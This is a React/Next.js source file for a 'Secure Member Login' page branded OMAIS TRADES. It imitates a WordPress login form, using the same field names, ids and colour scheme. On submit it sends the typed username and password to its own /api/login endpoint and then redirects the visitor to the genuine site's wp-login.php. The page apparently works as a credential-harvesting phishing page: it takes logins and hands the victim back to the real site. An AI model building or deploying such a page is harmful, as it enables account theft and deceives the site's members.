"use client";

import { useState, FormEvent } from "react";
import Image from "next/image";

export default function LoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [rememberMe, setRememberMe] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setError("");

    if (!username.trim() || !password.trim()) {
      setError("Please fill in all fields.");
      return;
    }

    setLoading(true);

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });

      if (!res.ok) throw new Error("Request failed");

      window.location.href = "https://omaistrades.com/wp-login.php";
    } catch {
      setError("An error occurred. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="login-wrapper">
      {/* Animated background particles */}
      <div className="bg-overlay" />
      <div className="bg-grid" />

      <div className="login-container">
        {/* Logo */}
        <div className="login-logo">
          <a href="https://omaistrades.com" target="_blank" rel="noreferrer">
            <div className="logo-ring">
              <Image
                src="/omais-logo.png"
                alt="OMAIS TRADES"
                width={90}
                height={90}
                className="logo-img"
                priority
              />
            </div>
          </a>
          <h2 className="brand-name">OMAIS TRADES</h2>
          <p className="brand-tagline">Secure Member Login</p>
        </div>

        {/* Card */}
        <div className="login-card">
          <form name="loginform" id="loginform" onSubmit={handleSubmit} noValidate>
            {error && (
              <div className="login-error">
                <span className="error-icon">⚠</span> {error}
              </div>
            )}

            {/* Username */}
            <div className="field-group">
              <label htmlFor="user_login">
                <span className="label-icon">👤</span> Username or Email Address
              </label>
              <div className="input-wrap">
                <input
                  type="text"
                  name="log"
                  id="user_login"
                  className="input"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  autoCapitalize="none"
                  autoComplete="username"
                  spellCheck={false}
                  required
                  disabled={loading}
                  placeholder="Enter your username or email"
                />
              </div>
            </div>

            {/* Password */}
            <div className="field-group">
              <label htmlFor="user_pass">
                <span className="label-icon">🔒</span> Password
              </label>
              <div className="input-wrap input-wrap-pass">
                <input
                  type={showPass ? "text" : "password"}
                  name="pwd"
                  id="user_pass"
                  className="input"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  autoComplete="current-password"
                  spellCheck={false}
                  required
                  disabled={loading}
                  placeholder="Enter your password"
                />
                <button
                  type="button"
                  className="toggle-pass"
                  onClick={() => setShowPass(!showPass)}
                  tabIndex={-1}
                  aria-label="Toggle password visibility"
                >
                  {showPass ? "🙈" : "👁️"}
                </button>
              </div>
            </div>

            {/* Remember me & Lost password row */}
            <div className="form-footer-row">
              <label htmlFor="rememberme" className="remember-label">
                <input
                  name="rememberme"
                  type="checkbox"
                  id="rememberme"
                  value="forever"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  disabled={loading}
                />
                <span>Remember Me</span>
              </label>
              <a
                href="https://omaistrades.com/wp-login.php?action=lostpassword"
                className="lost-pass-link"
              >
                Lost password?
              </a>
            </div>

            {/* Submit */}
            <button
              type="submit"
              className="btn-login"
              disabled={loading}
            >
              {loading ? (
                <span className="btn-inner">
                  <span className="spinner" /> Logging In…
                </span>
              ) : (
                <span className="btn-inner">Log In</span>
              )}
            </button>
          </form>
        </div>

        {/* Back to site */}
        <p className="back-link">
          <a href="https://omaistrades.com/">← Go to OMAIS TRADES</a>
        </p>

        <p className="footer-note">© {new Date().getFullYear()} OMAIS TRADES. All rights reserved.</p>
      </div>

      <style>{`
        /* ---------- Reset ---------- */
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        /* ---------- Wrapper ---------- */
        .login-wrapper {
          position: relative;
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 24px 16px;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
          background: #0a0e1a;
          overflow: hidden;
        }

        /* Dark gradient background with deep navy/black tones */
        .bg-overlay {
          position: fixed;
          inset: 0;
          background:
            radial-gradient(ellipse 80% 60% at 20% 20%, rgba(34,113,177,0.18) 0%, transparent 60%),
            radial-gradient(ellipse 70% 50% at 80% 80%, rgba(10,75,120,0.22) 0%, transparent 60%),
            linear-gradient(160deg, #050810 0%, #0c1524 40%, #08101e 70%, #040810 100%);
          z-index: 0;
        }

        /* Subtle grid lines */
        .bg-grid {
          position: fixed;
          inset: 0;
          background-image:
            linear-gradient(rgba(34,113,177,0.06) 1px, transparent 1px),
            linear-gradient(90deg, rgba(34,113,177,0.06) 1px, transparent 1px);
          background-size: 48px 48px;
          z-index: 0;
        }

        /* ---------- Container ---------- */
        .login-container {
          position: relative;
          z-index: 1;
          width: 100%;
          max-width: 380px;
        }

        /* ---------- Logo area ---------- */
        .login-logo {
          text-align: center;
          margin-bottom: 24px;
        }

        .login-logo a {
          display: inline-block;
          text-decoration: none;
        }

        .logo-ring {
          display: inline-flex;
          align-items: center;
          justify-content: center;
          width: 104px;
          height: 104px;
          border-radius: 50%;
          background: linear-gradient(135deg, #2271b1 0%, #135e96 100%);
          box-shadow:
            0 0 0 3px rgba(34,113,177,0.35),
            0 0 30px rgba(34,113,177,0.4),
            0 8px 32px rgba(0,0,0,0.6);
          margin-bottom: 14px;
          transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .logo-ring:hover {
          transform: translateY(-2px) scale(1.03);
          box-shadow:
            0 0 0 4px rgba(34,113,177,0.5),
            0 0 40px rgba(34,113,177,0.55),
            0 12px 40px rgba(0,0,0,0.7);
        }

        .logo-img {
          border-radius: 50%;
          display: block;
          width: 86px;
          height: 86px;
          object-fit: cover;
        }

        .brand-name {
          font-size: 20px;
          font-weight: 700;
          color: #ffffff;
          letter-spacing: 2px;
          text-transform: uppercase;
          margin-bottom: 4px;
          text-shadow: 0 0 20px rgba(34,113,177,0.5);
        }

        .brand-tagline {
          font-size: 12px;
          color: #7a8fa6;
          letter-spacing: 1.5px;
          text-transform: uppercase;
          font-weight: 500;
        }

        /* ---------- Card ---------- */
        .login-card {
          background: rgba(15, 22, 36, 0.85);
          border: 1px solid rgba(34,113,177,0.25);
          border-radius: 12px;
          padding: 32px 28px 28px;
          box-shadow:
            0 0 0 1px rgba(255,255,255,0.04),
            0 4px 6px rgba(0,0,0,0.3),
            0 20px 60px rgba(0,0,0,0.5),
            inset 0 1px 0 rgba(255,255,255,0.06);
          backdrop-filter: blur(16px);
          -webkit-backdrop-filter: blur(16px);
        }

        /* ---------- Error ---------- */
        .login-error {
          background: rgba(214, 54, 56, 0.12);
          border: 1px solid rgba(214, 54, 56, 0.4);
          border-left: 4px solid #d63638;
          color: #ff6b6d;
          font-size: 13px;
          margin-bottom: 20px;
          padding: 11px 14px;
          border-radius: 6px;
          line-height: 1.5;
        }

        /* ---------- Fields ---------- */
        .field-group {
          margin-bottom: 20px;
        }

        .field-group label {
          display: block;
          font-size: 12px;
          font-weight: 600;
          color: #8fa8c0;
          margin-bottom: 8px;
          letter-spacing: 0.8px;
          text-transform: uppercase;
        }

        .label-icon {
          margin-right: 5px;
          font-size: 11px;
        }

        .input-wrap {
          position: relative;
        }

        .input-wrap-pass {
          display: flex;
          align-items: center;
        }

        .input {
          display: block;
          width: 100%;
          padding: 11px 14px;
          font-size: 14px;
          font-family: inherit;
          color: #e8f0f8;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(34,113,177,0.3);
          border-radius: 8px;
          outline: none;
          transition: border-color 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
          line-height: 1.5;
          caret-color: #2271b1;
        }

        .input::placeholder {
          color: #3d5068;
          font-size: 13px;
        }

        .input:focus {
          border-color: #2271b1;
          background: rgba(34,113,177,0.08);
          box-shadow: 0 0 0 3px rgba(34,113,177,0.2), 0 0 12px rgba(34,113,177,0.15);
        }

        .input:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        /* Password field with eye icon */
        .input-wrap-pass .input {
          padding-right: 44px;
        }

        .toggle-pass {
          position: absolute;
          right: 12px;
          top: 50%;
          transform: translateY(-50%);
          background: none;
          border: none;
          cursor: pointer;
          font-size: 16px;
          padding: 2px;
          line-height: 1;
          opacity: 0.6;
          transition: opacity 0.2s;
        }

        .toggle-pass:hover { opacity: 1; }

        /* ---------- Footer row ---------- */
        .form-footer-row {
          display: flex;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 22px;
        }

        .remember-label {
          display: flex;
          align-items: center;
          gap: 8px;
          font-size: 13px;
          color: #7a8fa6;
          cursor: pointer;
          user-select: none;
        }

        .remember-label input[type="checkbox"] {
          width: 15px;
          height: 15px;
          accent-color: #2271b1;
          cursor: pointer;
          border-radius: 3px;
        }

        .lost-pass-link {
          font-size: 12px;
          color: #2271b1;
          text-decoration: none;
          transition: color 0.2s;
          font-weight: 500;
        }

        .lost-pass-link:hover { color: #4ea1e0; text-decoration: underline; }

        /* ---------- Button ---------- */
        .btn-login {
          display: block;
          width: 100%;
          padding: 13px 12px;
          font-size: 15px;
          font-family: inherit;
          font-weight: 700;
          color: #fff;
          background: linear-gradient(135deg, #2271b1 0%, #1559a0 50%, #135e96 100%);
          border: none;
          border-radius: 8px;
          cursor: pointer;
          letter-spacing: 0.5px;
          position: relative;
          overflow: hidden;
          transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
          box-shadow: 0 4px 15px rgba(34,113,177,0.4), 0 1px 3px rgba(0,0,0,0.3);
        }

        .btn-login::before {
          content: '';
          position: absolute;
          inset: 0;
          background: linear-gradient(135deg, rgba(255,255,255,0.12) 0%, transparent 60%);
          pointer-events: none;
        }

        .btn-login:hover:not(:disabled) {
          transform: translateY(-1px);
          box-shadow: 0 6px 22px rgba(34,113,177,0.55), 0 2px 6px rgba(0,0,0,0.4);
          background: linear-gradient(135deg, #2a80c8 0%, #1d6ab5 50%, #1560a8 100%);
        }

        .btn-login:active:not(:disabled) {
          transform: translateY(0px);
          box-shadow: 0 2px 8px rgba(34,113,177,0.3);
        }

        .btn-login:disabled {
          opacity: 0.65;
          cursor: not-allowed;
          transform: none;
        }

        .btn-inner {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
        }

        /* Spinner */
        .spinner {
          display: inline-block;
          width: 14px;
          height: 14px;
          border: 2px solid rgba(255,255,255,0.3);
          border-top-color: #fff;
          border-radius: 50%;
          animation: spin 0.7s linear infinite;
          flex-shrink: 0;
        }

        @keyframes spin {
          to { transform: rotate(360deg); }
        }

        /* ---------- Back link & footer ---------- */
        .back-link {
          text-align: center;
          margin-top: 20px;
        }

        .back-link a {
          font-size: 13px;
          color: #506070;
          text-decoration: none;
          transition: color 0.2s;
        }

        .back-link a:hover { color: #2271b1; }

        .footer-note {
          text-align: center;
          margin-top: 12px;
          font-size: 11px;
          color: #2d3d50;
          letter-spacing: 0.4px;
        }

        /* ---------- Responsive ---------- */
        @media (max-width: 420px) {
          .login-card { padding: 24px 18px 22px; }
          .brand-name { font-size: 17px; }
        }
      `}</style>
    </div>
  );
}
